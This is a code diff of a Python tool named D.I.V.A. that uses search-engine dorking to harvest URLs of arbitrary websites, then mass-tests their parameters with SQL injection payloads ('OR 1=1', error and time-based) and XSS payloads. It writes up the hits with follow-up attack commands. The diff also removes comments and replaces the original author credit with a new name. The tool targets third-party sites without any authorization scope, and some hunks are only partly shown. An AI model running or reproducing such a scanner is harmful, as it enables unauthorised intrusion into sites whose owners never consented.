@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
 # Dorking Intelligence & Vulnerability Arsenal (D.I.V.A)
-# Original Tool by kitn
 
 import requests
 import sys
@@ -13,7 +12,6 @@ import time
 import random
 import re
 
-# --- Palet Warna ---
 class Colors:
     PURPLE = "\033[95m"
     CYAN = "\033[96m"
@@ -30,12 +28,11 @@ def print_banner():
    =================================================
       Dorking Intelligence & Vulnerability Arsenal
                    (D.I.V.A) v6.0
-               | KILLING IN THE NAME |
-                  - Tool by kitn -
+            | KILLING IN THE NAME VERSION|
+                 - Tool by Copykopi -
    ================================================={Colors.RESET}
     """)
 
-# --- ARSENAL PAYLOAD BARU (SQLi) ---
 SQLI_PAYLOAD_ARSENAL = {
     'Boolean': ["' OR 1=1 -- ", "' OR '1'='1' -- ", "') OR ('1'='1"],
     'Error': ["'", "\"", "`", "')", "\")", "`)"],
@@ -43,7 +40,6 @@ SQLI_PAYLOAD_ARSENAL = {
 }
 SQLI_TIME_DELAY = 5 # detik
 
-# --- ARSENAL PAYLOAD BARU (XSS) ---
 XSS_PAYLOAD_ARSENAL = [
     "<script>alert('XSS')</script>",
     "'\"><img src=x onerror=alert('XSS')>",
@@ -52,14 +48,12 @@ XSS_PAYLOAD_ARSENAL = [
     "<details/open/ontoggle=alert('XSS')>"
 ]
 
-# --- Konfigurasi (Tidak Berubah) ---
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
 ]
 EXCLUDED_DOMAINS = ["youtube.com", "facebook.com", "twitter.com", "linkedin.com", "github.com"]
 EXCLUDED_EXTENSIONS = [".pdf", ".jpg", ".jpeg", ".png", ".gif", ".docx", ".txt", ".css"]
 
-# --- Fungsi Dorking dan Filtering (Tidak Berubah) ---
 def perform_dorking(query, max_results):
     print(f"{Colors.CYAN}[*] Performing dorking for query: '{query}'{Colors.RESET}")
     urls = set()
@@ -82,7 +76,6 @@ def perform_dorking(query, max_results):
     print(f"{Colors.GREEN}[+] Filtering complete. Proceeding with {len(filtered_urls)} potentially vulnerable URLs.{Colors.RESET}\n")
     return filtered_urls
 
-# --- Fungsi Pemindaian Inti (DIROMBAK TOTAL) ---
 def scan_url(url, session):
     findings = []
     headers = {'User-Agent': random.choice(USER_AGENTS)}
@@ -96,7 +89,6 @@ def scan_url(url, session):
         for param in params:
             original_value = params[param][0] if params[param] else ""
             
-            # --- SQLi Multi-Vector Scan ---
             sqli_found = False
             for category, payloads in SQLI_PAYLOAD_ARSENAL.items():
                 if sqli_found: break
@@ -123,7 +115,6 @@ def scan_url(url, session):
                         if (time.time() - start_time) >= SQLI_TIME_DELAY:
                             findings.append({'type': 'Time-Based SQLi', 'url': test_url, 'payload': payload}); sqli_found = True; break
             
-            # --- XSS Arsenal Scan ---
             xss_found = False
             for payload in XSS_PAYLOAD_ARSENAL:
                 if xss_found: break
@@ -136,7 +127,6 @@ def scan_url(url, session):
     except requests.exceptions.RequestException: pass
     return findings
 
-# --- (Sisa kode seperti `generate_followup_commands`, `save_results`, `main` tetap sama atau hanya butuh penyesuaian minor) ---
 def generate_followup_commands(all_findings):
     if not all_findings: return
     
@@ -170,7 +160,7 @@ def save_results(filename, all_urls, all_findings):
                     f.write(f"[POTENTIAL {find['type']}] on param '{find.get('param', 'N/A')}' with payload '{find['payload']}' -> {find.get('test_url') or find.get('url')}\n")
             
             f.write(f"\n\n--- [ FOLLOW-UP ARSENAL ] ---\n")
-            # ... (Logika penyimpanan follow-up commands sama seperti di v4.2)
+           
     except IOError as e: print(f"\n{Colors.RED}[!] Error saving results to file: {e}{Colors.RESET}")
 
 def main():
@@ -181,7 +171,6 @@ def main():
         epilog=f"""Example Usage:
   {sys.argv[0]} -q "inurl:product.php?id=" -n 200 -t 25 -o report.txt"""
     )
-    # ... (argparse tidak berubah)
     parser.add_argument("-q", "--query", required=True, help="[REQUIRED] The dorking query to search for.")
     parser.add_argument("-n", "--num-results", type=int, default=100, help="Number of dorking results to fetch. (default: 100)")
     parser.add_argument("-t", "--threads", type=int, default=20, help="Number of threads for concurrent scanning. (default: 20)")
